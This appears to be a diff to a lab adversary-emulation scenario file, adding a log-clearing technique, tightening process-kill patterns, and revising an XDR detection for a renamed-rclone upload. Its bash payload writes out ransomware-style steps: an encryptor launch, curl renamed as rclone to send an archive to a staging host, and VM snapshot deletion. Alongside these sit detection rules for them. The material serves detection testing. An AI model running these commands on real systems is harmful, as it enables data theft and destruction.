@@ -191,6 +191,17 @@
         ]
       },
       {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.002",
+        "name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
         "technique_id": "T1486",
         "name": "Data Encrypted for Impact",
         "tactic_ids": [
@@ -230,7 +241,7 @@
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# Endpoint legs of SIM-MP-031 (lab only). The scenario YAML is the source of truth; this is a summary.\nLAB=/tmp/cortexsim-mp031\n{ cat /proc/mounts; df -hP; find \"$LAB/vmfs/volumes\" -maxdepth 2 -type d; } > \"$LAB/ProgramData/found_shares.txt\"\nsetsid nohup \"$LAB/mnt/$STAGE_HOST/C\\$/Users/Public/locker\" --no_impl --key \"$CICADA_LAB_KEY\" -s 1 -p \"$LAB/mnt/$STAGE_HOST/C\\$/data\" &\ncp \"$(command -v curl)\" \"$LAB/ProgramData/rclone\"; \"$LAB/ProgramData/rclone\" -T \"$LAB/ProgramData/stage-01.tgz\" \"http://$STAGE_HOST:8080/cortexsim-mp031/\"\npkill -KILL -f vmx-cortexsim-mp031; find \"$LAB/vmfs/volumes\" -name '*.vmsn' -delete\nsh \"$LAB/Users/Public/1.sh\"   # locker --no_impl --key ... -p $LAB/vmfs/volumes -> *.kcr5umw + RECOVER-kcr5umw-DATA.txt",
+      "code": "# Endpoint legs of SIM-MP-031 (lab only). The scenario YAML is the source of truth; this is a summary.\nLAB=/tmp/cortexsim-mp031\n{ cat /proc/mounts; df -hP; find \"$LAB/vmfs/volumes\" -maxdepth 2 -type d; } > \"$LAB/ProgramData/found_shares.txt\"\nsetsid nohup \"$LAB/mnt/$STAGE_HOST/C\\$/Users/Public/locker\" --no_impl --key \"$CICADA_LAB_KEY\" -s 1 -p \"$LAB/mnt/$STAGE_HOST/C\\$/data\" &\ncp \"$(command -v curl)\" \"$LAB/ProgramData/rclone\"; \"$LAB/ProgramData/rclone\" -T \"$LAB/ProgramData/stage-01.tgz\" \"http://$STAGE_HOST:8080/cortexsim-mp031/\"\npkill -KILL -f '^vmx-cortexsim-mp031 '; find \"$LAB/vmfs/volumes\" -name '*.vmsn' -delete\nsh \"$LAB/Users/Public/1.sh\"   # locker --no_impl --key ... -p $LAB/vmfs/volumes -> *.kcr5umw + RECOVER-kcr5umw-DATA.txt",
       "input_variables": [
         {
           "name": "STAGE_HOST",
@@ -276,7 +287,7 @@
     ],
     "cleanup": {
       "interpreter": "bash",
-      "code": "pkill -KILL -f 'vmx-cortexsim-mp031' || true; rm -rf /tmp/cortexsim-mp031; rm -f /tmp/mp-031-threat.yml /tmp/mp-031-exfil.yml"
+      "code": "pkill -KILL -f '^vmx-cortexsim-mp031 ' || true; rm -rf /tmp/cortexsim-mp031; rm -f /tmp/mp-031-threat.yml /tmp/mp-031-exfil.yml"
     }
   },
   "detections": {
@@ -395,8 +406,8 @@
       },
       {
         "name": "MP-031 Renamed Binary Run as rclone from ProgramData with rclone conf",
-        "description": "A process whose image name is rclone but whose file signature or original name belongs to another tool runs from a ProgramData-shaped directory that also holds rclone.conf — the report's C:\\ProgramData\\rclone.exe + rclone.conf staging.",
-        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"rclone\", \"rclone.exe\")\n| filter action_process_image_path contains \"ProgramData\"\n| filter action_process_file_info_original_name != null and lowercase(action_process_file_info_original_name) not contains \"rclone\" or action_process_image_command_line contains \"rclone.conf\" or action_process_image_command_line contains \"-T \"\n| fields agent_hostname, action_process_image_path, action_process_image_command_line, action_process_image_sha256, causality_id",
+        "description": "A process whose image name is rclone (here a renamed curl, visible by its sha256) runs from a ProgramData-shaped directory that also holds rclone.conf — the report's C:\\ProgramData\\rclone.exe + rclone.conf staging.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name in (\"rclone\", \"rclone.exe\")\n| filter action_process_image_path contains \"ProgramData\"\n| filter action_process_image_command_line contains \"rclone.conf\" or action_process_image_command_line contains \"-T \" or action_process_image_command_line contains \"rclone/v\"\n| fields agent_hostname, action_process_image_path, action_process_image_command_line, action_process_image_sha256, causality_id",
         "severity": "high",
         "mitre_technique_ids": [
           "T1036.005",
@@ -421,7 +432,8 @@
         "severity": "high",
         "mitre_technique_ids": [
           "T1490",
-          "T1070.001"
+          "T1070.001",
+          "T1070.002"
         ],
         "suppression_window_seconds": 300
       },
